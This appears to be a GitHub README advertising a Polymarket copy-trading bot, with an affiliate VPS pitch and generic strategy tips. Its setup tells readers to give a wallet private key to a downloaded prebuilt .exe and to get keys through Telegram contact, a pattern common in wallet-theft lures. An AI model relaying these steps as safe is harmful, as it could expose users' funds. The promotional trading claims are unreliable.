# Polymarket - Copy Trading & Arbitrage Bot (Python & Rust)

A powerful dual-implementation bot for automated copy trading and arbitrage on Polymarket (Polygon blockchain). Choose between a flexible Python version or an ultra-fast Rust version for optimized performance.

## Contact & Support

- Telegram: [@soulcrancerdev](https://t.me/soulcrancerdev)
- X: [@soulcrancerdev](https://x.com/soulcrancerdev)

## How It Works
Watch demo: https://www.youtube.com/watch?v=6ZRIIPzv3d8

- buy example:
https://polygonscan.com/tx/0x04578bb1d11cd4d76ee5cbe60e8ffc1ac6d19e314c9205c31d7048af262125d7
- copy example:
https://polygonscan.com/tx/0x7f3552f2da30d362c68afe885b8c7a64e38a19e59b5872b402508862f5f96b84

---
## Trial Versions

### **Polymarket Copy Trading Bot - Rust (Demo)**  
- 🗂️ [polymarket_copytrading_bot_demo.zip](https://github.com/user-attachments/files/24639348/polymarket_copytrading_bot_demo.zip)
- 🗂️ [mempool_monitor.zip](https://github.com/user-attachments/files/24639353/mempool_monitor.zip)

### How To Run
1. Environment Variables Settings
   ```
    PRIVATE_KEY= # Your wallet's private key (64-character hex string, no 0x prefix).
    FUNDER_ADDRESS = # Your 40-character hex wallet address (with or without 0x), matching your PRIVATE_KEY.
    TARGET_WHALE_ADDRESS= # The whale address you want to copy trades from (40-character hex, no 0x prefix).
    ALCHEMY_API_KEY= # WebSocket RPC Provider (Alchemy is recommended for beginners, Contact me for this API key).
   ```
3. Run `polymarket_copytrading_bot_demo.exe`
<img width="1004" height="765" alt="Screenshot_7" src="https://github.com/user-attachments/assets/108af5c3-d585-41c2-bbac-536eb1472cc7" />

### Compact Features Summary

- **Polymarket Trading**: Real-time blockchain monitoring and automated trading on Polymarket via Polygon.
- **Copy Trading**: Mirror whale trades with configurable sizing, filters, and tiered strategies.
- **Order & Risk Management**: Advanced order types, retries, buffers, and circuit breakers to ensure safe trading.
- **Market-Specific**: Support for ATP Tennis and Ligue 1 Soccer markets with caching and live status detection.
- **Performance & Reliability**: Low-latency Rust implementation with reconnections and error handling.
- **Configuration & Logging**: Environment setup, validation tools, CSV logs, and detailed status reporting.

### Copy Trading Strategy (Current Version)

- **Main idea:** Automatically copy big traders at about 2% size, with safety checks to avoid risks.  
- **How:** Detect whale trades in real-time, decide how much to copy based on trade size, and place quick orders.  
- **Adjustments:** Adds small buffers to prices for better fills, especially in volatile markets like tennis and soccer.  
- **Retries:** If orders don’t fill, try again a few times, sometimes slightly increasing the price for large trades.  
- **Safety:** Stops trading if the market is illiquid or too risky, blocking trades for a few hours.  
- **Logs:** Keeps track of all trades for review.
---

## 🚀 VPS Recommendation – Low-Latency Execution & GEO restrictions support

**Latency = edge** in Polymarket.

**Trading VPS** is the go-to low-latency hosting solution among serious prediction-market and crypto bot runners.

- Sub-10 ms to major Polygon nodes  
- Crypto/HFT-optimized locations  
- Exceptional uptime & network performance  

Note: Polymarket has some GEO restrictions, so many Polymarket traders are using our AMS VPS and love it.  

**[Trading VPS →](https://app.tradingvps.io/aff.php?aff=60)**

Most users see noticeably better fills and lower slippage after switching.
---

## Popular Copy Trading Strategies

Based on trending discussions on X in 2025-2026, here are key strategies for successful Polymarket copy trading. These emphasize selecting consistent traders and avoiding common pitfalls (e.g., blind copying leading to losses in 90% of cases).

1. **Build a Portfolio of Traders**
   - Diversify across 3-5 traders with expertise in specific markets (e.g., sports, politics, crypto).
   - Analyze wallet history: P&L curve, win rate, risk-reward, max drawdown.
   - Use "Copy Score" (e.g., R² * win rate * profit factor) to rank traders.
   - Avoid loud whales; target small quants with steady profits.

2. **Proportional Sizing and Risk Limits**
   - Mirror trades proportionally (e.g., if whale risks 5% of $1M, you risk 5% of your portfolio).
   - Cap risk at 7% per trade, max 3 open positions.
   - Start small (0.1% allocation) for testing.

3. **Custom Bot Parameters**
   - Skip certain markets or categories.
   - Set size multipliers based on trade size/category (e.g., chase spreads for high-volume trades).
   - Use retries with FAK/GTD orders; adjust for live vs. non-live markets.
   - Copy % (e.g., 50-100% of trader's size).

4. **Target Specific Trader Types**
   - **AI Sentiment Bots**: Copy bots that profit from news reactions (5-20 min window).
   - **Mean Reversion Bots**: Follow bots snapping up panic dumps.
   - **Undervaluation Traders**: Mirror those betting on low-attention, mispriced markets (e.g., lower leagues).
   - **Low/High Price Specialists**: Copy low-entry (0.1¢) high-frequency or high-entry (99¢) near-resolution plays.

5. **Wallet Baskets Approach**
   - Group 5-10 similar wallets; enter only when 80%+ align on the same outcome within a tight price range.

6. **Pre-Copy Checklist**
   - Trade manually first (10-20 trades) to understand risk.
   - Observe 5-10 trades before automating.
   - Match trader expertise to your interests (e.g., skip NHL if unfamiliar).
   - Ensure liquid markets (min $1M volume) to avoid moving prices.

7. **Advanced Tips**
   - Combine with domain specialization (10-20% allocation).
   - Monitor for adverse selection: Ensure your slippage + fees < trader's edge per share.
   - Learn from failures: Avoid being exit liquidity or news traps.

### Getting RPC URLs

- **Polygon**: Use Polygon RPC endpoints or Alchemy. Contact me for a free RPC URLs.

## 🤝 Support & Community

Fork, star, and contribute to the project on GitHub.

Reach out via Telegram: [@soulcrancerdev](https://t.me/soulcrancerdev)
